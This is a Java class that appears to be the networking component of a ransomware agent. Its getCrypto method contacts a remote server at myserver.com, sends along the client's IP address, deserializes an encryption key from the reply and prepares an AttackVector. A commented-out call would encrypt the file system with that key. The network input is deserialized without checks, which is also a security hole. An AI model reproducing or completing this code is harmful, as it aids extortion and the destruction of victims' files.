package Agent.networking;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.net.HttpURLConnection;
import java.net.Socket;
import java.net.URL;
import javax.servlet.http.HttpServletRequest;

import org.springframework.beans.factory.annotation.Value;
import Agent.Attack.AttackVector;
import Agent.entites.CryptoKey;

public class Client {

	HttpServletRequest request;


	public void getCrypto() throws IOException {

		URL urlForGetRequest = new URL("http://www.myserver.com");
		HttpURLConnection con = (HttpURLConnection) urlForGetRequest.openConnection();
		String ipAdress = request.getRemoteAddr();
		con.setRequestMethod("GET");
		con.setRequestProperty("Content-Type", "application/json");
		con.setRequestProperty("ip", ipAdress); // set userId its a sample here
		int responseCode = con.getResponseCode();
		if (responseCode == HttpURLConnection.HTTP_OK) {
			ObjectInputStream is = new ObjectInputStream(con.getInputStream());
			try {
				CryptoKey key = (CryptoKey) is.readObject();
				AttackVector attack = new AttackVector();
				//attack.encryptFileSystem(key);
			} catch (ClassNotFoundException | IOException e) {
				e.printStackTrace();
			}

			/*
			 * try (BufferedReader in = new BufferedReader(new
			 * InputStreamReader(con.getInputStream()))) { StringBuffer response = new
			 * StringBuffer(); while ((readLine = in.readLine()) != null) {
			 * response.append(readLine); in.close();
			 */

		} else {
			System.out.println("GET NOT WORKED");
		}
	}

}
